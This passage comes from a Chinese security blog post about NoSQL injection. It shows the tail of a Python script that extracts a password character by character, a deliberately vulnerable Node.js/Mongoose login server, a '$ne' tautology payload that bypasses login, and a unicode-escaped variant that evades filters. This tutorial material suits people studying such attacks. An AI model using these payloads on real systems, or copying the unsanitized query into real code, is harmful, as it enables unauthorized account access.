            #headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;
            #r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json

            r = requests.post(url=url, data=post_payload)
            if &#x27;Login Success&#x27; in r.text:
                print(&quot;[+] %s&quot; % (password + c))
                password += c


# 输出如下: 
# [+] 1
# [+] 12
# [+] 123
# [+] 1234
# [+] 12345
# [+] 123456</code></pre>
<h3 id="nodejs中的mongodb注入"><a class="markdownIt-Anchor" href="#nodejs中的mongodb注入"></a> Nodejs中的MongoDB注入</h3>
<p>NodeJS里面的Nosql就主要式重言式注入了，构造永真式密码来实现登陆绕过</p>
<ul>
<li>server.js</li>
</ul>
<pre><code class="highlight plaintext">var express = require(&#x27;express&#x27;);
var mongoose = require(&#x27;mongoose&#x27;);
var jade = require(&#x27;jade&#x27;);
var bodyParser = require(&#x27;body-parser&#x27;);

mongoose.connect(&#x27;mongodb://localhost/test&#x27;, &#123; useNewUrlParser: true &#125;);
var UserSchema = new mongoose.Schema(&#123;
    name: String,
    username: String,
    password: String
&#125;);
var User = mongoose.model(&#x27;users&#x27;, UserSchema);
var app = express();

app.set(&#x27;views&#x27;, __dirname);
app.set(&#x27;view engine&#x27;, &#x27;jade&#x27;);

app.get(&#x27;/&#x27;, function(req, res) &#123;
    res.render (&quot;index.jade&quot;,&#123;
        message: &#x27;Please Login&#x27;
    &#125;);
&#125;);

app.use(bodyParser.json());

app.post(&#x27;/&#x27;, function(req, res) &#123;
    console.log(req.body)
    User.findOne(&#123;username: req.body.username, password: req.body.password&#125;, function (err, user) &#123;
        console.log(user)
        if (err) &#123;
            return res.render(&#x27;index.jade&#x27;, &#123;message: err.message&#125;);
        &#125;
        if (!user) &#123;
            return res.render(&#x27;index.jade&#x27;, &#123;message: &#x27;Login Failed&#x27;&#125;);
        &#125;

        return res.render(&#x27;index.jade&#x27;, &#123;message: &#x27;Welcome back &#x27; + user.name + &#x27;!&#x27;&#125;);
    &#125;);
&#125;);

var server = app.listen(8000, &#x27;0.0.0.0&#x27;, function () &#123;

    var host = server.address().address
    var port = server.address().port
    console.log(&quot;listening on http://%s:%s&quot;, host, port)
&#125;);
</code></pre>
<ul>
<li>index.jade</li>
</ul>
<pre><code class="highlight plaintext">h1 #&#123;message&#125;
p #&#123;message&#125;</code></pre>
<p>运行访问，发送</p>
<pre><code class="highlight plaintext">&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:1&#125;&#125;</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161641-79e9c82a-ec57-1.png" alt="20210724161641-79e9c82a-ec57-1"></p>
<p>成功登录</p>
<p>如果<code>$ne</code>关键字被过滤也可以用unicode来绕过</p>
<p>因为JSON是可以直接解unicode的</p>
<p>belike:</p>
<pre><code class="highlight plaintext">&#123;&quot;username&quot;:&#123;&quot;\u0024\u006e\u0065&quot;:1&#125;,&quot;password&quot;: &#123;&quot;\u0024\u006e\u0065&quot;:1&#125;&#125;
// &#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</code></pre>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>请我一杯咖啡吧！</div>
  <button>
    赞赏
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.jpg" alt="AyaN0 微信">
        <span>微信</span>
      </div>

  </div>
</div>

          <div class="post-tags">
              <a href="/tags/Web-SQL/" rel="tag"># -Web -SQL</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/06/22/2025%E5%B9%B4%E4%B8%AD%E6%80%BB%E7%BB%93/" rel="prev" title="2025年中总结">
                  <i class="fa fa-angle-left"></i> 2025年中总结
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" rel="next" title="磨好的利剑:PHP原生类">
                  磨好的利剑:PHP原生类 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">AyaN0</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">363k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">10:59</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
